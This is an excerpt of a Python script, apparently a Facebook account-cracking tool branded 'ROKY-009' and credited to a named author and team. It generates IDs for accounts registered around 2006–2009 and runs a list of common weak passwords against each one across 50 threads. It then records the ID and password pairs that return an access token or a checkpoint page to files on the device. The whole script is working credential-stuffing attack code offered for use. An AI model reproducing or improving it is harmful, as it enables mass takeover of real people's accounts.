...
sys.stdout.write('\x1b]2; (ROKY-009) \x07')
...
def main():
    os.system("clear")
    detail = {"AUTHOR":"RAKIB HASAN ROKY","TEAM":"KILLER OF MAFIA","FEATURE":"2006-9 CLONER","VERSION":"1.5 FREE"}
    print(json.dumps(detail,indent=4))
    print(f"{G} START TIME  : {G}{date}{R}~{G}{month}{R}~{G}{year}")
    print(36*"-")
...
def start_clone(series=None):
    ...
    try:
        ...
        with ThreadPoolExecutor(max_workers=50) as MrCode143:
            ...
            for user in ids:
                email = mdx + user
                passlist = ["123456","1234567","12345678","1234567890","123456789","112233","111111","987654321","222222","123123","11223344","786786","102030"]
...
def OwnerApi(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r {W}-> ROKY-009|{Y}{loop}{W}|OK/CP|•| {G}{len(oks)}{N}/{R}{len(cps)}")
    sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if "access_token" in response:
                print(f"\r\r {W}-> {G}ROKY-OK • {ids} • {pas}")
                open("/sdcard/ROKY-009-OLD-OK.txt","a").write(uid+"|"+pas+"\n")
                oks.append(ids)
            elif "www.facebook.com" in response["error"]["message"]:
                print(f"\r\r {W}-> {R}ROKY-CP • {ids} • {pas}")
                open("/sdcard/ROKY-009-OLD-CP.txt","a").write(uid+"|"+pas+"\n")
                cps.append(ids)
            else:continue
        loop += 1
    except Exception as e:
